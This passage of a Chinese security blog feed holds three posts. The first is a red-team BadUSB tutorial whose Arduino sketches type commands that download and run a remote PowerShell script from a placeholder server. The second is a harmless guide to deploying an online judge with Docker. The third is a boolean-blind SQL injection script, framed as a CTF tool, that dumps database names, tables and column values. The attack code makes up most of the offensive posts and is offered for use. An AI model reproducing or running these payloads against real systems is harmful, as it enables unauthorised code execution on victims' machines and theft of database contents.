class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_LEFT_GUI);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;cmd /c echo set-alias -name xz -value IEX;xs (New-Object \\&quot;</span>NeT.WeBClient\\<span class="string">&quot;).downloadstring(&#x27;&lt;http://xxxxx/xxx.ps1&gt;&#x27;) | powershell&quot;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_ALT);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">releaseAll</span>();</span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">loop</span>() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/Red-Team-Invasion-BadUSB/Untitled4.png" alt="Untitled"></p></li></ol><h2 id="四、释放编译代码"><a href="#四、释放编译代码" class="headerlink" title="四、释放编译代码"></a>四、释放编译代码</h2><p>如果已经写入了攻击代码，但是不想去执行的话，可以在插入U盘之前，先打开记事本，插入U盘之后，不停点击在记事本上。</p><h2 id="五、快速取消cmd弹框"><a href="#五、快速取消cmd弹框" class="headerlink" title="五、快速取消cmd弹框"></a>五、快速取消cmd弹框</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_ALT);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;c&#x27;</span>);</span><br><span class="line">Keyboard.<span class="title function_ invoke__">releaseAll</span>();</span><br><span class="line">Keyboard.<span class="title function_ invoke__">end</span>();<span class="comment">// 结束键盘模拟</span></span><br></pre></td></tr></table></figure><h2 id="六、自编译"><a href="#六、自编译" class="headerlink" title="六、自编译"></a>六、自编译</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include &lt;Keyboard.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">setup</span>() &#123;</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">begin</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(KEY_LEFT_GUI);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(<span class="string">&#x27;r&#x27;</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">releaseAll</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">500</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;powershell&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$url</span>=\\&#x27;&lt;http://&lt;vps_ip&gt;:&lt;port&gt;/xxx.ps1\\&gt;&#x27;&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$output</span>=\\&#x27;c:\\\\windows\\\\temp\\\\xxx.ps1\\&#x27;&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">press</span>(KEY_CAPS_LOCK);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">release</span>(KEY_CAPS_LOCK);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$client</span>=new-object System.Net.WebClient&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">2000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;<span class="subst">$client</span>.DownloadFile(<span class="subst">$URL</span>,<span class="subst">$OUTPUT</span>)&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">5000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>(<span class="string">&quot;C:\\\\Windows\\\\Temp\\\\XXX.PS1&quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">1000</span>);</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  Keyboard.<span class="title function_ invoke__">println</span>();</span><br><span class="line">  <span class="title function_ invoke__">delay</span>(<span class="number">10000</span>);</span><br><span class="line">  <span class="comment">//Keyboard.press(KEY_LEFT_ALT);</span></span><br><span class="line">  <span class="comment">//Keyboard.press(&#x27; &#x27;);</span></span><br><span class="line">  <span class="comment">//Keyboard.press(&#x27;c&#x27;);</span></span><br><span class="line">  <span class="comment">//Keyboard.releaseAll();</span></span><br><span class="line">  Keyboard.<span class="title function_ invoke__">end</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_ invoke__">loop</span>() &#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 红队入侵 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队近源BadUSB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【其他经验】OJ系统—OnlineJudgeDeploy搭建</title>
      <link href="/2024/04/11/Extracurricular-experience-OJ-System-build/"/>
      <url>/2024/04/11/Extracurricular-experience-OJ-System-build/</url>
      
        <content type="html"><![CDATA[<h1 id="【其他经验】OJ系统—OnlineJudgeDeploy搭建"><a href="#【其他经验】OJ系统—OnlineJudgeDeploy搭建" class="headerlink" title="【其他经验】OJ系统—OnlineJudgeDeploy搭建"></a>【其他经验】OJ系统—OnlineJudgeDeploy搭建</h1><h2 id="一、环境准备"><a href="#一、环境准备" class="headerlink" title="一、环境准备"></a>一、环境准备</h2><h3 id="1、云服务器"><a href="#1、云服务器" class="headerlink" title="1、云服务器"></a>1、云服务器</h3><p>既然搭建OJ，肯定不能只在本地访问，而是让大家都可以访问的到，那么云服务器是必不可少的。</p><p>在国内，像阿里云、腾讯云、华为云等，需要购买一台服务器，如果访问量少的话，一台2核(vCPU) 2GiB 的配置就够了。</p><p>推荐的操作系统是Diban、Centos、Ubuntu 等Linux 操作系统。Windows可以使用Windows Server机器，但是相较于Linux操作来说，windows机器配置相较麻烦。</p><p>下面以Debian操作系统为例。</p><h3 id="2、Docker"><a href="#2、Docker" class="headerlink" title="2、Docker"></a>2、Docker</h3><p>安装docker</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get update </span><br><span class="line">apt-get install docker.io</span><br><span class="line"></span><br><span class="line">//查看是否安装</span><br><span class="line">docker --version</span><br></pre></td></tr></table></figure><h3 id="3、Docker-compose"><a href="#3、Docker-compose" class="headerlink" title="3、Docker-compose"></a>3、Docker-compose</h3><p>可以从官网或者GitHub上下载</p><p>也可直接从百度网盘下载：<img src="/img/Extracurricular-experience-OJ-System-build/image-20240413161404491.png" alt="image-20240413161404491"></p><p>下载好之后上传到云服务器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、将下载的compose上传到服务器之后：</span><br><span class="line">mv docker-compose-linux-x86_64 /usr/local/bin/docker-compose</span><br><span class="line">2、添加执行权限：</span><br><span class="line">chmod +x /usr/local/bin/docker-compose</span><br><span class="line">3、检查版本：</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure><h2 id="二、OJ系统搭建"><a href="#二、OJ系统搭建" class="headerlink" title="二、OJ系统搭建"></a>二、OJ系统搭建</h2><p>1、找一个空白文件夹，下载需要的资源</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone -b 2.0 https://github.com/QingdaoU/OnlineJudgeDeploy.git</span><br></pre></td></tr></table></figure><p>2、进入目录，执行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd OnlineJudgeDeploy </span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>安装好后，浏览器打开服务器IP地址即可。</p><p>后台在 &#x2F;admin 下，默认后台账号密码：root&#x2F;rootroot。</p><p>登陆后台请及时修改密码</p><h2 id="三、题库下载"><a href="#三、题库下载" class="headerlink" title="三、题库下载"></a>三、题库下载</h2><p>题库下载地址：<a href="http://tk.hustoj.com/problemset.php?search=free">http://tk.hustoj.com/problemset.php?search=free</a></p>]]></content>
      
      
      <categories>
          
          <category> 其他经验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OJ系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Python武器库】SQL注入脚本—布尔注入（第一篇）</title>
      <link href="/2024/04/08/Python-tools-SQLBoole/"/>
      <url>/2024/04/08/Python-tools-SQLBoole/</url>
      
        <content type="html"><![CDATA[<h1 id="【Python武器库】SQL注入脚本—布尔注入（第一篇）"><a href="#【Python武器库】SQL注入脚本—布尔注入（第一篇）" class="headerlink" title="【Python武器库】SQL注入脚本—布尔注入（第一篇）"></a>【Python武器库】SQL注入脚本—布尔注入（第一篇）</h1><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在做CTF 的过程中，出题人限制SQLMap 的使用，但是手工注入又过于麻烦和耗时，于是想自己手把手写一个自己的SQL注入脚本工具，不必像SQLMap 那样具备强大的功能，仅仅在CTF 或其他SQL注入场景够用即可。</p><p>常做CTF 的同学都知道，CTF 的SQL注入场景最多的是布尔注入，那么这里先制作布尔注入的脚本工具。</p><h1 id="二、工具使用示例"><a href="#二、工具使用示例" class="headerlink" title="二、工具使用示例"></a>二、工具使用示例</h1><h2 id="1、本地测试"><a href="#1、本地测试" class="headerlink" title="1、本地测试"></a>1、本地测试</h2><p><img src="/img/Python-tools-SQLBoole/image-20240408173516618.png" alt="image-20240408173516618"></p><p><img src="/img/Python-tools-SQLBoole/image-20240408173707655.png" alt="image-20240408173707655"></p><h2 id="2、CTF实战示例"><a href="#2、CTF实战示例" class="headerlink" title="2、CTF实战示例"></a>2、CTF实战示例</h2><p><img src="/img/Python-tools-SQLBoole/image-20240408175520812.png" alt="image-20240408175520812"></p><p><img src="/img/Python-tools-SQLBoole/image-20240408175616830.png" alt="image-20240408175616830"></p><h1 id="三、脚本拆分"><a href="#三、脚本拆分" class="headerlink" title="三、脚本拆分"></a>三、脚本拆分</h1><h2 id="1、先看主线程"><a href="#1、先看主线程" class="headerlink" title="1、先看主线程"></a>1、先看主线程</h2><p>为了让输出有重点区分，采用了颜色输出，所以main()方法看起来非常的混乱，但是运行起来非常的醒目。</p><p>在main()方法中启用了一个副线程，是为了程序在执行过程中给用户一个正在执行中的一个进度条加载的提示。</p><p>同时使用while 死循环，方便用户便利查询数据库中所有的表和字段以及数值信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">### 主程序</span><br><span class="line">def main():</span><br><span class="line">    print(f&#x27;--------- &#123;__file__&#125; 开始运行 ---------------&#x27;)</span><br><span class="line">    # （1）初始化环境和参数变量</span><br><span class="line">    global threading_status</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m 注意：该脚本使用的前提是知道注入点存在的URL、页面回显属于布尔类型、过滤的方法、以及cookie相关&#x27;)</span><br><span class="line">    print(&#x27;\033[94m[*]\033[0m 注意：在使用前请\033[91m修改url 和 Response_judgment 函数\033[0m&#x27;)</span><br><span class="line">    # 创建一个副线程对象</span><br><span class="line">    sub_thread = threading.Thread(target=Progress_bar)</span><br><span class="line">    sub_thread.start()      # 启动副线程</span><br><span class="line"></span><br><span class="line">    # （2）开始查询数据库</span><br><span class="line">    print(&#x27;\033[93m---------------------------- 数据库名查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     #开启副线程</span><br><span class="line">    database_names = database_name(database_length())   #这里传入数据库的长度</span><br><span class="line">    threading_status = False    #关闭副线程</span><br><span class="line">    if not database_names:</span><br><span class="line">        print(&quot;\033[91m[-]\033[0m 查询失败，请调整\033[91mdatabase_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    print(f&quot;\n\033[92m[+]\033[0m 当前\033[96m数据库名\033[0m为：\033[94m&#123;database_names&#125;\033[0m&quot;)</span><br><span class="line">    # （3）开始查询数据库表</span><br><span class="line">    print(&#x27;\033[93m---------------------------- 数据库表查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">    threading_status = True     # 启动副线程</span><br><span class="line">    table_names = table_name(table_length())            #求表的名称，传入表的长度</span><br><span class="line">    threading_status = False    #关闭副线程</span><br><span class="line">    if len(table_names) == 0:</span><br><span class="line">        print(&quot;\n\033[91m[-]\033[0m 查询失败，请调整\033[91mtable_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">        kill()</span><br><span class="line">    while True:                 #这里做无限循环，以方便循环查询所有的表</span><br><span class="line">        print(&#x27;\n\033[93m---------------------------- 选择查询的库表 ------------------------------\033[0m&#x27;)</span><br><span class="line">        print(f&quot;\033[92m[+]\033[0m &#123;database_names&#125;所有\033[96m表名\033[0m为：\033[94m&#123;table_names&#125;\033[0m&quot;)</span><br><span class="line">        User_table_name = input(&#x27;请输入要查看的表名（exit退出）：&#x27;)</span><br><span class="line">        if User_table_name == &#x27;exit&#x27;:</span><br><span class="line">            break</span><br><span class="line">        # （4）开始查询数据库表字段</span><br><span class="line">        print(&#x27;\033[93m---------------------------- 库表字段查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">        threading_status = True     # 启动副线程</span><br><span class="line">        column_names = column_name(column_length(User_table_name),User_table_name)       #求字段的名字，输入字段的长度</span><br><span class="line">        threading_status = False    #关闭副线程</span><br><span class="line">        if len(column_names) == 0:</span><br><span class="line">            print(&quot;\n\033[91m[-]\033[0m 查询失败，请调整\033[91mcolumn_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">            kill()</span><br><span class="line">        while True:             #这里做无限循环，方便查询表的所有字段值</span><br><span class="line">            print(&#x27;\n\033[93m---------------------------- 选择查询字段名 ------------------------------\033[0m&#x27;)</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_table_name&#125;表所有\033[96m字段名\033[0m为：\033[94m&#123;column_names&#125;\033[0m&quot;)</span><br><span class="line">            User_column_name = input(&#x27;请输入要查看的字段名（exit退出）：&#x27;)</span><br><span class="line">            if User_column_name == &#x27;exit&#x27;:</span><br><span class="line">                break</span><br><span class="line">            # （5）开始查询数据库表字段的数据值</span><br><span class="line">            print(&#x27;\033[93m---------------------------- 字段数据查询中 ------------------------------\033[0m&#x27;)</span><br><span class="line">            threading_status = True     # 启动副线程</span><br><span class="line">            column_data_len = column_data_length(User_table_name,User_column_name)   #求字段值的长度，传入字段的名称</span><br><span class="line">            column_data_names = column_data_name(column_data_len,User_table_name,User_column_name)  #求字段的值</span><br><span class="line">            threading_status = False    #关闭副线程</span><br><span class="line">            print(&#x27;\n\033[92m---------------------------- 字段数据查询结束 ------------------------------\033[0m&#x27;)</span><br><span class="line">            if len(column_data_names) == 0:</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m 查询失败，请调整\033[91mcolumn_data_length函数中对数值爆破的长度值，或检查使用的payload\033[0m&quot;)</span><br><span class="line">                print(&quot;\033[91m[-]\033[0m 查询失败。如果增大查询力度仍不可用，则此处可能是一张空表，可更换其他表或字段查看&quot;)</span><br><span class="line">                kill()</span><br><span class="line">            print(f&quot;\033[92m[+]\033[0m &#123;User_column_name&#125;字段所有\033[96m数值\033[0m为：\033[94m&#123;column_data_names&#125;\033[0m&quot;)</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    try:</span><br><span class="line">        main()  #执行主线程</span><br><span class="line">        kill()  #执行处理函数</span><br><span class="line">    except Exception:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure><h2 id="2、异常和副线程"><a href="#2、异常和副线程" class="headerlink" title="2、异常和副线程"></a>2、异常和副线程</h2><p>kill() 作为异常中断的函数，是为了使程序异常之后能够安全的退出；Progress_bar() 是副线程的执行内容，是不断的执行输出进度条，方便用户查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">def Progress_bar():</span><br><span class="line">    # 初始化参数</span><br><span class="line">    global threading_status</span><br><span class="line">    global jindu_left</span><br><span class="line"></span><br><span class="line">    while not threading_stop:</span><br><span class="line">        while threading_status:</span><br><span class="line">            progress_bar = &quot;\033[94m[*]\033[0m 查询中：\033[92m[\033[0m&#123;0&#125;\033[92m]\033[0m&quot;.format(&quot; &quot; * jindu_left + &quot;\033[92m*\033[0m&quot; + &quot; &quot; * (50 - jindu_left))</span><br><span class="line"></span><br><span class="line">            # 清除之前的进度指示器输出</span><br><span class="line">            sys.stdout.write(&quot;\r&quot; + progress_bar)</span><br><span class="line"></span><br><span class="line">            # 刷新输出，确保进度指示器立即更新</span><br><span class="line">            sys.stdout.flush()</span><br><span class="line"></span><br><span class="line">            jindu_left = 0 if jindu_left == 50 else jindu_left + 1</span><br><span class="line"></span><br><span class="line">            time.sleep(0.5)</span><br><span class="line">def kill():</span><br><span class="line">    global threading_status</span><br><span class="line">    global threading_stop</span><br><span class="line"></span><br><span class="line">    print(&quot;\033[91m[-]\033[0m 正在退出，请等待！！！&quot;)</span><br><span class="line">    threading_status = False</span><br><span class="line">    threading_stop = True</span><br><span class="line">    time.sleep(2)</span><br><span class="line">    print(&quot;Bye！程序已退出！！！&quot;)</span><br><span class="line">    exit()</span><br></pre></td></tr></table></figure><h2 id="3、基本的数据查询"><a href="#3、基本的数据查询" class="headerlink" title="3、基本的数据查询"></a>3、基本的数据查询</h2><p>使用基础的布尔查询语句，将payload 传入Response_judgment() 中进行布尔判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">### 查询数据库表字段的数值</span><br><span class="line">def column_data_name(column_data_len,User_table_name,User_column_name):</span><br><span class="line">    column_data_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_data_len)):         #i是第几个字段的值</span><br><span class="line">        for j in range(1,column_data_len[i]+1):     #j是要爆破字段值的第几个字符</span><br><span class="line">            for n in asciis:                        #asciis是要爆破字段值的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select &quot; + User_column_name + &quot; from &quot; + User_table_name + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_column_name&#125;字段的第&#123;i&#125;个值为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_data_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_data_names</span><br><span class="line"></span><br><span class="line">### 查询数据库表字段数值的长度</span><br><span class="line">def column_data_length(User_table_name,User_column_name):</span><br><span class="line">    column_data_len = &#123;&#125;</span><br><span class="line">    for i in range(0,data_num_max):           #只查询10个数值</span><br><span class="line">        flag = False</span><br><span class="line">        for j in range(1,data_len_max):       #j是要爆破字段数值的长度，猜测该字段数值最大为32（即md5值，可能需要修改）</span><br><span class="line">            payload = &quot;%20and%20length((select &quot;+ User_column_name +&quot; from &quot;+ User_table_name +&quot; limit &quot;+ str(i) +&quot;,1))=&quot; + str(j)</span><br><span class="line">            if Response_judgment(payload):</span><br><span class="line">                column_data_len[i] = j</span><br><span class="line">                if i == data_num_max:</span><br><span class="line">                    print(&#x27;已超过测试数值的最大值，请调整！！！&#x27;)</span><br><span class="line">                flag = True</span><br><span class="line">                break</span><br><span class="line">        if flag == False:</span><br><span class="line">            break</span><br><span class="line">    return column_data_len</span><br><span class="line"></span><br><span class="line">### 查询数据库表字段的名称</span><br><span class="line">def column_name(column_len,User_table_name):</span><br><span class="line">    column_names = &#123;&#125;</span><br><span class="line">    column_one_name = &#x27;&#x27;</span><br><span class="line">    for i in range(0,len(column_len)):          #i是第几个字段，len(column_len) 是字段的数量</span><br><span class="line">        for j in range(1,column_len[i]+1):      #j是要爆破字段的第几个字符</span><br><span class="line">            for n in asciis:              #n是要爆破字段名的ascii码值</span><br><span class="line">                payload = &quot;%20and%20ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot; + hex(int.from_bytes(User_table_name.encode(),&#x27;big&#x27;)) + &quot; limit &quot;+ str(i) +&quot;,1),&quot; + str(j) + &quot;,1))=&quot; + str(ord(n))</span><br><span class="line">                if Response_judgment(payload):</span><br><span class="line">                    column_one_name += n</span><br><span class="line">                    break</span><br><span class="line">        print(f&quot;\n&#123;User_table_name&#125;表的第&#123;i&#125;个字段的名称为：&#123;column_one_name&#125;&quot;)</span><br><span class="line">        column_names[i] = column_one_name</span><br><span class="line">        column_one_name = &#x27;&#x27;</span><br><span class="line">    return column_names</span><br><span class="line"></span><br><span class="line">### 